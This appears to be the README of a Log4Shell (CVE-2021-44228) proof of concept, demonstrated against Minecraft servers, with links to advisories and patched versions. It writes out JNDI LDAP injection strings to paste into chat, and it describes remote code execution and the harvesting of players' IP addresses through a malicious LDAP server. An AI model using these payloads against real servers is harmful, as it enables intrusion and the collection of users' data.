# Log4J-RCE-Proof-Of-Concept (CVE-2021-44228)

This is a proof of concept of the log4j rce.

Here are some links for the CVE-2021-44228:
- https://www.lunasec.io/docs/blog/log4j-zero-day
- https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
- https://github.com/apache/logging-log4j2/pull/608
- https://www.youtube.com/watch?v=JPGola6BamU

This bug affects nearly all log4j2 and maybe log4j1 versions. The recommended version to use is **2.15.0** which fixes the exploit.

## Demonstration with minecraft (which uses log4j2)

- Details for the impact on minecraft are listed here: https://twitter.com/slicedlime/status/1469150993527017483
- Article from minecraft is here: https://www.minecraft.net/en-us/article/important-message--security-vulnerability-java-edition
- Fixed minecraft forge versions: https://twitter.com/gigaherz/status/1469331288368861195
- Fixed minecraft fabric versions: https://twitter.com/slicedlime/status/1469192689904193537
- Fixed minecraft paper versions: https://twitter.com/aurora_smiles_/status/1469205803232026625
- Fixed minecraft spigot versions: https://www.spigotmc.org/threads/spigot-security-releases-%E2%80%94-1-8-8%E2%80%931-18.537204/
- Fixed minecraft sponge versions: https://discord.com/channels/142425412096491520/303772747907989504/918744598065586196

### Lag or sending serialized data 

- Paste ``${jndi:ldap://127.0.0.1/e}`` in the chat. If there is an open socket on port ``389`` logj4 tries to connect and blocks further communiction until a timeout occurs.
- When using this proof of concept exploit, the log in the console will log ``THIS IS SEND TO THE LOG!!! LOG4J EXPLOIT!`` which is a serialized string object from the ldap server.

![image](https://user-images.githubusercontent.com/7681220/145529175-b6f88cf0-67d0-450b-a834-87942202d594.png)

- Additionally the malicious ldap server receives every ip address where the message is logged. This means that ip adresses of players on a server can be collected which this exploit.

### RCE

- Paste ``${jndi:ldap://127.0.0.1/exe}`` in the chat. If ``-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`` is set to true the remote code execution will happen.

![image](https://user-images.githubusercontent.com/7681220/145529797-a3952c3e-c81e-4e91-b383-490688736f9c.png)

- Fortunately modern jdks disable remote class loading by default. (https://www.oracle.com/java/technologies/javase/8u121-relnotes.html)
- Old versions may still allow this!!


 
